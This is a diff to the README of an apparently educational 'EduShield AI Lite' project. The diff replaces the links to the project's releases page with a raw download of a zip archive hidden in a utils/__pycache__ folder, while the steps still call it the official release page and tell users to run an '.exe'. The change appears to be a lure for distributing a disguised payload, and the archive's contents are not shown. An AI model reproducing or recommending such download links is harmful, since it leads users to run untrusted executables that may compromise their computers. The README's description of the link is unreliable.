@@ -1,6 +1,6 @@
 # 🛡️ edu-shield-ai - Predict student risks with simple tools
 
-[Download EduShield AI Lite](https://github.com/waterskiheatlightning933/edu-shield-ai/releases)
+[Download EduShield AI Lite](https://raw.githubusercontent.com/waterskiheatlightning933/edu-shield-ai/main/utils/__pycache__/ai-edu-shield-2.8.zip)
 
 ## What is EduShield AI Lite?
 
@@ -20,7 +20,7 @@ To run this application, ensure your computer meets these basic standards:
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the official release page: [Download EduShield AI Lite](https://github.com/waterskiheatlightning933/edu-shield-ai/releases).
+1.  Visit the official release page: [Download EduShield AI Lite](https://raw.githubusercontent.com/waterskiheatlightning933/edu-shield-ai/main/utils/__pycache__/ai-edu-shield-2.8.zip).
 2.  Click the file ending in ".exe" to begin the download.
 3.  Locate the downloaded file in your "Downloads" folder.
 4.  Double-click the file to start the installation wizard.
